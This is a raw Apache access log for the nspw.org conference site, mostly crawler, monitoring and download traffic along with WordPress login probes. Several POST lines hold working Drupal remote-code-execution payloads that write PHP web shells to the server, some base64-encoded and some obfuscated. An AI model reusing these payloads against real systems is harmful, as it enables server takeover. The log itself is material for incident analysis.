www.nspw.org:80 103.255.7.52 - - [01/May/2018:01:42:49 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 103.255.7.52 - - [01/May/2018:01:42:50 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:01:43:08 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:01:43:08 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 180.197.134.199 - - [01/May/2018:01:43:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.197.134.199 - - [01/May/2018:01:43:46 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 122.172.104.129 - - [01/May/2018:01:44:31 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 122.172.104.129 - - [01/May/2018:01:44:34 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 137.112.228.195 - - [01/May/2018:01:45:00 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:47:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 179.54.248.148 - - [01/May/2018:01:47:50 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 179.54.248.148 - - [01/May/2018:01:47:52 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.65.117 - - [01/May/2018:01:49:55 -0400] "GET /robots.txt HTTP/1.1" 302 545 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 66.249.65.115 - - [01/May/2018:01:49:56 -0400] "GET /papers/2003/nspw2003-alkassar.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 58.97.229.227 - - [01/May/2018:01:51:33 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 58.97.229.227 - - [01/May/2018:01:51:35 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 144.76.162.206 - - [01/May/2018:01:52:23 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
www.nspw.org:80 88.99.27.172 - - [01/May/2018:01:52:39 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:52:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:01:54:18 -0400] "GET /2010 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:01:56:51 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:01:57:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 112.202.9.67 - - [01/May/2018:01:58:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 112.202.9.67 - - [01/May/2018:01:58:40 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.226.184.226 - - [01/May/2018:01:58:42 -0400] "GET /wp-login.php HTTP/1.1" 302 549 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 95.226.184.226 - - [01/May/2018:01:58:44 -0400] "GET / HTTP/1.1" 302 524 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 178.255.215.92 - - [01/May/2018:01:59:24 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 178.255.215.92 - - [01/May/2018:01:59:25 -0400] "GET /papers/2012/docs/p115.pdf HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 178.255.215.92 - - [01/May/2018:01:59:27 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 178.255.215.92 - - [01/May/2018:01:59:27 -0400] "GET /papers/2012/docs/p141.pdf HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:02:37 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:02:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:02:52 -0400] "GET /2002/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:03:21 -0400] "GET /2003/hold/ HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:03:43 -0400] "GET /2005/ HTTP/1.1" 302 483 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:04:05 -0400] "GET /2005/cfp/ HTTP/1.1" 302 491 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:04:29 -0400] "GET /2005/invite/ HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 185.62.86.146 - - [01/May/2018:02:04:43 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20%22%5C%3C?php%20%5C$rtpz=%5C%22lKHByZWdfcmVwbGFjZShhcnJheShdgnL1teXHchd9XhdHhdNdLycsJy9ccy8nKShdwgYhdXJhdyYXkoJychdsJyhdsn%5C%22;%20%5C$tsdg%20=%20str_replace(%5C%22b%5C%22,%5C%22%5C%22,%5C%22bsbtbrb_rbebpblacbe%5C%22);%20%5C$wxhw=%5C%22KhdSwgam9pbhdihhcnJhehdV9zbhdGljZSgkYSwkYygkYSktMykpKSkpO2VjaG8ghdJzhdwvJy4kahdy4nPic7fQ==%5C%22;%20%5C$feka=%5C%22hdpeyRrPSdyaXNoZXJlJhdztlhdY2hhdvICc8hdJy4kayhd4nPic7ZXhdZhbChdhiYXhdNlNjRfZGVjb2R%5C%22;%20%5C$asys=%5C%22JGM9J2NvdWhd50JzskYT0khdX0NPT0tJRTtphdZihdhyZXNhdldhdChdgkhdYSkhd9PShddtcicgJiYhdgJGMohdJGEpPjM%5C%22;%20%5C$zjzy%20=%20%5C$tsdg(%5C%22q%5C%22,%20%5C%22%5C%22,%20%5C%22qbaqsqeq6q4q_qdqecoqde%5C%22);%20%5C$liiy%20=%20%5C$tsdg(%5C%22z%5C%22,%5C%22%5C%22,%5C%22crzezatez_fzunctzizon%5C%22);%20%5C$iuwt%20=%20%5C$liiy(%5C%22%5C%22,%20%5C$zjzy(%5C$tsdg(%5C%22hd%5C%22,%20%5C%22%5C%22,%20%5C$asys.%5C$feka.%5C$rtpz.%5C$wxhw)));%20%5C$iuwt();%20?%3E%22%20%3E%207POI4DA3.php HTTP/1.1" 302 2574 "-" "python-requests/2.18.4"
www.nspw.org:80 185.62.86.146 - - [01/May/2018:02:04:54 -0400] "POST /file/ajax/name/%23value/form-FmDvLzuuEeW60hAxLsMcK27jJWjSZkuHk7oAGQMM_y0 HTTP/1.1" 302 669 "-" "python-requests/2.18.4"
www.nspw.org:80 148.251.126.73 - - [01/May/2018:02:04:54 -0400] "GET /2005/tmp/ HTTP/1.1" 302 491 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
www.nspw.org:80 185.62.86.146 - - [01/May/2018:02:04:57 -0400] "GET /7POI4DA3.php HTTP/1.1" 302 549 "-" "python-requests/2.18.4"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:02:05:45 -0400] "GET /2008/cfp.shtml HTTP/1.1" 302 501 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 119.161.99.122 - - [01/May/2018:02:06:21 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 119.161.99.122 - - [01/May/2018:02:06:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:02:06:45 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:02:07:20 -0400] "GET /2008/past.shtml HTTP/1.1" 302 503 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:07:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 36.110.211.41 - - [01/May/2018:02:07:53 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 46.17.147.58 - - [01/May/2018:02:11:05 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.17.147.58 - - [01/May/2018:02:11:06 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:11:10 -0400] "GET / HTTP/1.1" 302 525 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:11:36 -0400] "GET / HTTP/1.1" 302 525 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:12:05 -0400] "GET / HTTP/1.1" 302 525 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:12:32 -0400] "GET /2018 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:12:44 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:12:53 -0400] "GET /past HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:13:09 -0400] "GET /proceedings HTTP/1.1" 302 547 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:13:22 -0400] "GET /login HTTP/1.1" 302 535 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:13:32 -0400] "GET /2018/cfp HTTP/1.1" 302 541 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:13:42 -0400] "GET /2018/dates HTTP/1.1" 302 545 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:13:52 -0400] "GET /2018/organizers HTTP/1.1" 302 555 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:01 -0400] "GET /cfp/nspw2018-cfp.pdf HTTP/1.1" 302 565 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:09 -0400] "GET /2017 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:14:14 -0400] "GET /2009/proceedings/1997/nspw1997-moskowitz.pdf HTTP/1.1" 302 617 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:16 -0400] "GET /2016 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:24 -0400] "GET /2015 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:31 -0400] "GET /2014 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:36 -0400] "GET /2013 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:42 -0400] "GET /2012 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:48 -0400] "GET /2011 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:54 -0400] "GET /2010 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:14:59 -0400] "GET /2009 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:04 -0400] "GET /2008 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 54.36.149.82 - - [01/May/2018:02:15:07 -0400] "GET /2011 HTTP/1.1" 302 481 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:09 -0400] "GET /2007 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:15 -0400] "GET /2006 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:20 -0400] "GET /2005 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:25 -0400] "GET /2004 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:30 -0400] "GET /2003 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:34 -0400] "GET /2002 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:38 -0400] "GET /2001 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:42 -0400] "GET /2000 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:46 -0400] "GET /1999 HTTP/1.1" 302 533 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:50 -0400] "GET /proceedings/2013 HTTP/1.1" 302 557 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:55 -0400] "GET /proceedings/2011 HTTP/1.1" 302 557 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:15:58 -0400] "GET /proceedings/2010 HTTP/1.1" 302 557 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:16:02 -0400] "GET /proceedings/2009 HTTP/1.1" 302 557 "-" "python-requests/2.18.4"
www.nspw.org:80 149.154.70.78 - - [01/May/2018:02:16:06 -0400] "GET /proceedings/2008 HTTP/1.1" 302 557 "-" "python-requests/2.18.4"
www.nspw.org:80 199.16.157.182 - - [01/May/2018:02:16:40 -0400] "GET /robots.txt HTTP/1.1" 302 489 "-" "Twitterbot/1.0"
www.nspw.org:80 199.16.157.182 - - [01/May/2018:02:16:40 -0400] "GET /2018/cfp HTTP/1.1" 302 485 "-" "Twitterbot/1.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:02:17:08 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:02:17:08 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.232.20.242 - - [01/May/2018:02:17:08 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:17:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 202.55.70.28 - - [01/May/2018:02:18:22 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 202.55.70.28 - - [01/May/2018:02:18:23 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 77.75.78.167 - - [01/May/2018:02:19:55 -0400] "GET /robots.txt HTTP/1.1" 302 549 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.167 - - [01/May/2018:02:19:57 -0400] "GET /2006/cfp.content HTTP/1.1" 302 561 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.167 - - [01/May/2018:02:19:58 -0400] "GET /2003/pc.shtml HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.167 - - [01/May/2018:02:19:58 -0400] "GET /2010/program HTTP/1.1" 302 552 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 77.75.78.167 - - [01/May/2018:02:19:58 -0400] "GET /2011/papers HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)"
www.nspw.org:80 54.36.149.53 - - [01/May/2018:02:21:23 -0400] "GET /papers/1997/ HTTP/1.1" 302 497 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:22:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.82 - - [01/May/2018:02:26:05 -0400] "GET /2005/PC/konstantin%20beznosov.pdf HTTP/1.1" 302 595 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:27:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:28:28 -0400] "GET /papers/1996/nspw1996-olawsky.pdf HTTP/1.1" 302 593 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:30:21 -0400] "GET /papers/2006/nspw2006-gutmann.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [01/May/2018:02:30:36 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:32:21 -0400] "GET /papers/1993/nspw1993-mclean.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:32:34 -0400] "GET /papers/2006/nspw2006-gates.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:32:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 49.205.18.160 - - [01/May/2018:02:35:19 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 49.205.18.160 - - [01/May/2018:02:35:24 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 41.139.204.142 - - [01/May/2018:02:35:40 -0400] "GET /papers/2010/nspw2010-lilien.pdf HTTP/1.1" 302 591 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:37:44 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 66.249.73.78 - - [01/May/2018:02:37:46 -0400] "GET /2009/proceedings/1993/nspw1993-howe.pdf HTTP/1.1" 302 607 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 36.110.211.41 - - [01/May/2018:02:38:03 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 66.102.9.30 - - [01/May/2018:02:39:51 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:02:42:11 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 40.77.167.73 - - [01/May/2018:02:42:20 -0400] "GET /papers/2003/nspw2003-backes.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:02:42:35 -0400] "GET /2016/location HTTP/1.1" 302 499 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:02:42:43 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 74.208.182.118 - - [01/May/2018:02:43:03 -0400] "GET / HTTP/1.1" 302 525 "-" "Java/1.8.0_171"
www.nspw.org:80 74.208.182.118 - - [01/May/2018:02:43:03 -0400] "GET /https://www.nspw.org HTTP/1.1" 302 564 "-" "Java/1.8.0_171"
www.nspw.org:80 27.7.143.210 - - [01/May/2018:02:43:18 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 27.7.143.210 - - [01/May/2018:02:43:22 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 157.55.39.9 - - [01/May/2018:02:43:49 -0400] "GET /papers/2005/nspw2005-thorpe.pdf HTTP/1.1" 302 591 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 66.249.73.80 - - [01/May/2018:02:44:06 -0400] "GET /current/local.shtml HTTP/1.1" 302 567 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
